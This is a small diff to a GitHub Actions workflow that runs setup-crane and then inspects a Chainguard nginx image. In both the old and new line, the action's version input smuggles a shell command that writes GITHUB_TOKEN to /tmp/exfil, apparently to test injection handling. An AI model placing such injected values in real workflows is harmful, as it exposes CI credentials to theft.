@@ -14,7 +14,7 @@ jobs:
 
       - uses: imjasonh/setup-crane@v0.5
         with:
-          version: "$(echo "token=$GITHUB_TOKEN" > /tmp/exfil && echo -n v0.5.1)"
+          version: $(echo "token=$GITHUB_TOKEN" > /tmp/exfil && echo -n v0.5.1)
       - run: |
           crane digest cgr.dev/chainguard/nginx
           crane manifest cgr.dev/chainguard/nginx | jq
